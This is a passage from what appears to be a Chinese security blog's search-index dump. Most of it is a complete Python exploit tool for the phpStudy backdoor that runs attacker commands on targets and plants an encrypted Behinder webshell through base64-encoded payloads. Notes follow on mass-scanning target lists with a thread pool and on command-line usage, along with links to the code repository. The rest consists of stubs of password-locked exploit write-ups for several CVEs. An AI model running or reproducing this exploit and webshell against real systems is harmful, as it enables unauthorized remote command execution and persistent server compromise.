class="string">"cGhwaW5mbygpOw=="</span>,</span><br><span class="line">            <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip,deflate"</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            PocRequest = requests.get(self._url,headers=poc,timeout=TIME_OUT)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"phpinfo"</span> <span class="keyword">in</span> str(PocRequest.content):</span><br><span class="line">                print(<span class="string">'[+] Target is vulnerable.'</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'[-] Target is NOT vulnerable.'</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">        headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">        headers[<span class="string">'Accept-Charset'</span>] = self._command</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(self._url,headers=headers)</span><br><span class="line">            response.encoding = <span class="string">'gbk'</span></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                print(<span class="string">'[+] Command Execute Successful.'</span>)</span><br><span class="line">                print(response.text)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 print(<span class="string">'[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.\n'</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload_shell_2018</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">        headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">        headers[<span class="string">'Accept-Charset'</span>] = <span class="string">'ZmlsZV9wdXRfY29udGVudHMoJy4vUEhQVHV0b3JpYWwvV1dXL2Fib3V0LnBocCcsICc8P3BocApAZXJyb3JfcmVwb3J0aW5nKDApOwpzZXNzaW9uX3N0YXJ0KCk7CmlmIChpc3NldCgkX0dFVFsicGFzcyJdKSkKewogICAgJGtleT1zdWJzdHIobWQ1KHVuaXFpZChyYW5kKCkpKSwxNik7CiAgICAkX1NFU1NJT05bImsiXT0ka2V5OwogICAgcHJpbnQgJGtleTsKfQplbHNlCnsKICAgICRrZXk9JF9TRVNTSU9OWyJrIl07CgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsKCWlmKCFleHRlbnNpb25fbG9hZGVkKCJvcGVuc3NsIikpCgl7CgkJJHQ9ImJhc2U2NF8iLiJkZWNvZGUiOwoJCSRwb3N0PSR0KCRwb3N0LiIiKTsKCQkKCQlmb3IoJGk9MDskaTxzdHJsZW4oJHBvc3QpOyRpKyspIHsKICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgCiAgICAJCQl9Cgl9CgllbHNlCgl7CgkJJHBvc3Q9b3BlbnNzbF9kZWNyeXB0KCRwb3N0LCAiQUVTMTI4IiwgJGtleSk7Cgl9CiAgICAkYXJyPWV4cGxvZGUoInwiLCRwb3N0KTsKICAgICRmdW5jPSRhcnJbMF07CiAgICAkcGFyYW1zPSRhcnJbMV07CgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcCkge2V2YWwoJHAuIiIpO319CglAbmV3IEMoJHBhcmFtcyk7Cn0KPz4nKTs='</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(self._url,headers=headers)</span><br><span class="line">            response.encoding = <span class="string">'gbk'</span></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                print(<span class="string">'[+] Upload Successful.'</span>)</span><br><span class="line">                print(<span class="string">'[+] The webshell is &#123;&#125;//&#123;&#125;/about.php'</span>.format(self._url.split(<span class="string">'/'</span>)[<span class="number">0</span>],self._url.split(<span class="string">'/'</span>)[<span class="number">2</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 print(<span class="string">'[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.\n'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload_shell_2016</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">        headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">        headers[<span class="string">'Accept-Charset'</span>] = <span class="string">'ZmlsZV9wdXRfY29udGVudHMoJy4vV1dXL2Fib3V0LnBocCcsICc8P3BocApAZXJyb3JfcmVwb3J0aW5nKDApOwpzZXNzaW9uX3N0YXJ0KCk7CmlmIChpc3NldCgkX0dFVFsicGFzcyJdKSkKewogICAgJGtleT1zdWJzdHIobWQ1KHVuaXFpZChyYW5kKCkpKSwxNik7CiAgICAkX1NFU1NJT05bImsiXT0ka2V5OwogICAgcHJpbnQgJGtleTsKfQplbHNlCnsKICAgICRrZXk9JF9TRVNTSU9OWyJrIl07CgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsKCWlmKCFleHRlbnNpb25fbG9hZGVkKCJvcGVuc3NsIikpCgl7CgkJJHQ9ImJhc2U2NF8iLiJkZWNvZGUiOwoJCSRwb3N0PSR0KCRwb3N0LiIiKTsKCQkKCQlmb3IoJGk9MDskaTxzdHJsZW4oJHBvc3QpOyRpKyspIHsKICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgCiAgICAJCQl9Cgl9CgllbHNlCgl7CgkJJHBvc3Q9b3BlbnNzbF9kZWNyeXB0KCRwb3N0LCAiQUVTMTI4IiwgJGtleSk7Cgl9CiAgICAkYXJyPWV4cGxvZGUoInwiLCRwb3N0KTsKICAgICRmdW5jPSRhcnJbMF07CiAgICAkcGFyYW1zPSRhcnJbMV07CgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcCkge2V2YWwoJHAuIiIpO319CglAbmV3IEMoJHBhcmFtcyk7Cn0KPz4nKTs='</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(self._url,headers=headers)</span><br><span class="line">            response.encoding = <span class="string">'gbk'</span></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                print(<span class="string">'[+] Upload Successful.'</span>)</span><br><span class="line">                print(<span class="string">'[+] The webshell is &#123;&#125;//&#123;&#125;/about.php'</span>.format(self._url.split(<span class="string">'/'</span>)[<span class="number">0</span>],self._url.split(<span class="string">'/'</span>)[<span class="number">2</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 print(<span class="string">'[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.\n'</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    x = phpstudy_backdoor_getshell(<span class="string">''</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            url = input(<span class="string">"Target url:\n"</span>)</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">'http://'</span> <span class="keyword">or</span> <span class="string">'https://'</span>) <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">                print(<span class="string">'[-] Please input target url with http or https'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'[-] Checking Target...'</span>)</span><br><span class="line">                x.url = url</span><br><span class="line">                <span class="keyword">if</span> x.check_Target():</span><br><span class="line">                    cmd = input(<span class="string">"Input Your Command:\n"</span>)</span><br><span class="line">                    command = base64.b64encode(cmd.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">                    x.command = command</span><br><span class="line">                    x.exploit()</span><br><span class="line">                    print(<span class="string">'[-] upload a Behinder webshell'</span>)</span><br><span class="line">                    target = input(<span class="string">'Please choose the version for phpstudy [2018/2016]\n'</span>)</span><br><span class="line">                    <span class="keyword">if</span> target == <span class="string">'2018'</span>:</span><br><span class="line">                        x.upload_shell_2018()</span><br><span class="line">                    <span class="keyword">elif</span> target == <span class="string">'2016'</span>:</span><br><span class="line">                        x.upload_shell_2016()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">'[-] some error!'</span>)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h3 id="漏洞复现及php传shell"><a href="#漏洞复现及php传shell" class="headerlink" title="漏洞复现及php传shell"></a>漏洞复现及php传shell</h3><p><a href="http://www.lsowl.top/2019/09/28/PHP%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/#more" target="_blank" rel="noopener">PHP文件写入</a></p>
<p><a href="http://www.lsowl.top/2019/09/28/phpstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#more" target="_blank" rel="noopener">phpstudy后门漏洞复现</a></p>
<h3 id="代码编写总结"><a href="#代码编写总结" class="headerlink" title="代码编写总结"></a>代码编写总结</h3><blockquote>
<p>记录一些忘了的点，想到哪说哪</p>
</blockquote>
<h4 id="关闭https警告"><a href="#关闭https警告" class="headerlink" title="关闭https警告"></a>关闭https警告</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br></pre></td></tr></table></figure>
<h4 id="使用线程池"><a href="#使用线程池" class="headerlink" title="使用线程池"></a>使用线程池</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    files = input(<span class="string">'please input the files:\n'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(files,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            lines = f.read().splitlines()  <span class="comment">#读取为一个列表</span></span><br><span class="line">            print(lines)</span><br><span class="line">            task_pool = threadpool.ThreadPool(<span class="number">10</span>)</span><br><span class="line">            requests = threadpool.makeRequests(check,lines)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> req <span class="keyword">in</span> requests:</span><br><span class="line">            task_pool.putRequest(req)</span><br><span class="line">            task_pool.wait()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>
<h4 id="requests请求后解析时自动判断编码问题"><a href="#requests请求后解析时自动判断编码问题" class="headerlink" title="requests请求后解析时自动判断编码问题"></a>requests请求后解析时自动判断编码问题</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">自动判断编码后，使用requests.text有时候会乱码，直接一点，在返回解析时指定编码</span><br><span class="line"></span><br><span class="line">result.encoding = <span class="string">'gbk'</span></span><br></pre></td></tr></table></figure>
<h4 id="面向对象编程（类）高级用法"><a href="#面向对象编程（类）高级用法" class="headerlink" title="面向对象编程（类）高级用法"></a>面向对象编程（类）高级用法</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">为了保证安全性以及代码的健壮性，不直接定义私有变量，而是通过提示私有变量，通过装饰器来实现,并且使用object来继承，方便高级调用</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">phpstudy_backdoor_getshell</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url,command)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line">        self._command = command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#访问器 - getter()方法</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#修改器 - setter()方法</span></span><br><span class="line"><span class="meta">    @url.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @command.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(self,command)</span>:</span></span><br><span class="line">        self._command = command</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">初始化的时候带了了参数，所以在实例化的时候要带参数（脑子一抽风），懒得改了，直接在实例化的时候传两个空参数进去，后面再进行自己构造调用</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    x = phpstudy_backdoor_getshell(<span class="string">''</span>,<span class="string">''</span>)  <span class="comment">#空参数</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            url = input(<span class="string">"Target url:\n"</span>)</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">'http://'</span> <span class="keyword">or</span> <span class="string">'https://'</span>) <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">                print(<span class="string">'[-] Please input target url with http or https'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'[-] Checking Target...'</span>)</span><br><span class="line">                x.url = url					<span class="comment">#具体调用</span></span><br><span class="line">                <span class="keyword">if</span> x.check_Target():</span><br><span class="line">                    cmd = input(<span class="string">"Input Your Command:\n"</span>)</span><br><span class="line">                    command = base64.b64encode(cmd.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">                    x.command = command</span><br><span class="line">                    x.exploit()</span><br><span class="line">                    print(<span class="string">'[-] upload a Behinder webshell'</span>)</span><br><span class="line">                    target = input(<span class="string">'Please choose the version for phpstudy [2018/2016]\n'</span>)</span><br><span class="line">                    <span class="keyword">if</span> target == <span class="string">'2018'</span>:</span><br><span class="line">                        x.upload_shell_2018()</span><br><span class="line">                    <span class="keyword">elif</span> target == <span class="string">'2016'</span>:</span><br><span class="line">                        x.upload_shell_2016()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">'[-] some error!'</span>)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>
<h4 id="argparse参数化解析编程"><a href="#argparse参数化解析编程" class="headerlink" title="argparse参数化解析编程"></a>argparse参数化解析编程</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">定义description以及usage，为了防止在调用命令时出现的如反斜杠之类的参数被转义，使用单双引号等避免转义，略显麻烦</span><br><span class="line"></span><br><span class="line">parse = argparse.ArgumentParser(description=<span class="string">'EXP for phpstudy_backdoor.'</span>)</span><br><span class="line">    parse.usage=<span class="string">"""phpstudy_backdoor_getshell.py [-h] [-u URL] [-c ...]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       example: python3 phpstudy_backdoor_getshell.py -u http://192.168.1.103/index.php -c 'system(\\"whoami\\");'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       使用反斜杠和单双引号防止转义的问题，并解决argparse下以空格解析参数不能当做一个字符串的问题</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">在定义参数时，后面可能跟不止一个参数，尤其是执行系统命令，为了方便，不限定后面接的数量（nargs=argparse.REMAINDER）；同时使用解析参数的时候将后面跟的参数（以空格分开的）拼接成一个字符串</span><br><span class="line"></span><br><span class="line">parse.add_argument(<span class="string">'-c'</span>,<span class="string">'--command'</span>, nargs=argparse.REMAINDER,help=<span class="string">'Please input the exploit command'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.url <span class="keyword">and</span> args.command:</span><br><span class="line">            commands = <span class="string">''</span> </span><br><span class="line">            <span class="keyword">for</span> cmd <span class="keyword">in</span> args.command:</span><br><span class="line">                commands += cmd + <span class="string">' '</span></span><br><span class="line">            command = base64.b64encode(commands.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">            x.url = args.url</span><br><span class="line">            x.command = command</span><br><span class="line">            x.exploit()</span><br></pre></td></tr></table></figure>
<p>主要是一些细节上的点记不清了，特此记录一下</p>
<h3 id="代码地址"><a href="#代码地址" class="headerlink" title="代码地址"></a>代码地址</h3><p><a href="https://github.com/demossl/phpstudy_backdoor_getshell" target="_blank" rel="noopener">github地址</a></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://yzddmr6.tk/posts/phpstudy-backdoor/" target="_blank" rel="noopener">https://yzddmr6.tk/posts/phpstudy-backdoor/</a></p>
<p><a href="https://github.com/NS-Sp4ce/PHPStudy_BackDoor_Exp" target="_blank" rel="noopener">https://github.com/NS-Sp4ce/PHPStudy_BackDoor_Exp</a></p>
]]></content>
      <categories>
        <category>POC/EXP编写</category>
      </categories>
      <tags>
        <tag>code</tag>
        <tag>poc</tag>
        <tag>exp</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-13272 Linux Kernel< 5.1.17 PTRACE_TRACEME 漏洞复现</title>
    <url>/2019/10/08/CVE-2019-13272-Linux-Kernel-5-1-17-PTRACE-TRACEME-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<div id="hbe-security">
  <div class="hbe-input-container">
  <input type="password" class="hbe-form-control" id="pass" placeholder="您好, 这里需要密码." />
    <label for="pass">您好, 这里需要密码.</label>
    <div class="bottom-line"></div>
  </div>
</div>
<div id="decryptionError" style="display: none;">Incorrect Password!</div>
<div id="noContentError" style="display: none;">No content to display!</div>
<div id="encrypt-blog" style="display:none">

</div>
<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>CVE-2019-13272</tag>
      </tags>
  </entry>
  <entry>
    <title>Numpy反序列化命令执行漏洞复现</title>
    <url>/2019/10/08/Numpy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<div id="hbe-security">
  <div class="hbe-input-container">
  <input type="password" class="hbe-form-control" id="pass" placeholder="您好, 这里需要密码." />
    <label for="pass">您好, 这里需要密码.</label>
    <div class="bottom-line"></div>
  </div>
</div>
<div id="decryptionError" style="display: none;">Incorrect Password!</div>
<div id="noContentError" style="display: none;">No content to display!</div>
<div id="encrypt-blog" style="display:none">

</div>
<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>Numpy</tag>
      </tags>
  </entry>
  <entry>
    <title>phpstudy后门漏洞复现</title>
    <url>/2019/09/28/phpstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<div id="hbe-security">
  <div class="hbe-input-container">
  <input type="password" class="hbe-form-control" id="pass" placeholder="您好, 这里需要密码." />
    <label for="pass">您好, 这里需要密码.</label>
    <div class="bottom-line"></div>
  </div>
</div>
<div id="decryptionError" style="display: none;">Incorrect Password!</div>
<div id="noContentError" style="display: none;">No content to display!</div>
<div id="encrypt-blog" style="display:none">

</div>
<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>phpstudy</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP文件写入</title>
    <url>/2019/09/28/PHP%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/</url>
    <content><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<div id="hbe-security">
  <div class="hbe-input-container">
  <input type="password" class="hbe-form-control" id="pass" placeholder="您好, 这里需要密码." />
    <label for="pass">您好, 这里需要密码.</label>
    <div class="bottom-line"></div>
  </div>
</div>
<div id="decryptionError" style="display: none;">Incorrect Password!</div>
<div id="noContentError" style="display: none;">No content to display!</div>
<div id="encrypt-blog" style="display:none">

</div>
<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>PHP基础</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>webshell写入</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-12181 Serv-U 15.1.6 Privilege Escalation本地提权漏洞复现</title>
    <url>/2019/08/08/CVE-2019-12181-Serv-U-15-1-6-Privilege-Escalation%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<div id="hbe-security">
  <div class="hbe-input-container">
  <input type="password" class="hbe-form-control" id="pass" placeholder="您好, 这里需要密码." />
    <label for="pass">您好, 这里需要密码.</label>
    <div class="bottom-line"></div>
  </div>
</div>
<div id="decryptionError" style="display: none;">Incorrect Password!</div>
<div id="noContentError" style="display: none;">No content to display!</div>
<div id="encrypt-blog" style="display:none">
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